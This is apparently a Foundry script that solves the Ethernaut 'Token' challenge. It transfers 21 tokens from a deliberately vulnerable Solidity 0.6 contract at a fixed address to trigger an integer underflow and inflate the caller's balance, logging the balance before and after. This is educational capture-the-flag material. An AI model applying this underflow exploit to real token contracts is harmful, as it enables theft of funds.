// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Test, console} from "forge-std/Test.sol";

import {Token} from "../../src/ethernaut/Token.sol";

contract tokenHackScript is Test {
    Token public contractInstance;

    function setUp() public {
        contractInstance = Token(0x00Ea5B6a793c09826F54f0ac4a73248A2901E574);
    }

    function test_run() public {
        vm.startBroadcast();
        console.log(
            "Current balance is :",
            contractInstance.balanceOf(msg.sender)
        );
        contractInstance.transfer(
            0x55C76828DF0ef0EB13DEA4503C8FAad51Abd00Ad,
            21
        );
        console.log(
            "New balance is :",
            contractInstance.balanceOf(msg.sender)
        );
        vm.stopBroadcast();
    }
}
